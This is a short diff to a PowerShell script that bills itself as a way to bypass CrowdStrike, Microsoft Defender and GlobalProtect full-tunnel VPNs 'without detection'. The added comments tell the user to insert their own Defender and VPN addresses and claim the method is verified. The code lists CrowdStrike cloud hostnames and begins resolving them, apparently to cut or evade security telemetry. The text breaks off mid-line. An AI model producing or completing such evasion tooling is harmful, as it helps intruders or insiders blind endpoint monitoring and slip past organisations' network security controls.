@@ -1,4 +1,6 @@
 # This can be used to bypass Crowdstrike, Defender, And Globalprotect full-tunnel VPNs without detection. 
+# You'll need to add your own defender links to the target_URLs
+# You'll also need to add your own addresses for Globalprotect VPNs, but it's verified to work. 
 $target_URLs = @("ts01-gyr-maverick.cloudsink.net", "ts01-b.cloudsink.net", "lfodown01-gyr-maverick.cloudsink.net", "lfodown01-b.cloudsink.net")
 $IPs =@()
 $target_URLs | foreach-object {Invoke-WebRequest -TimeoutSec 1 -uri $_
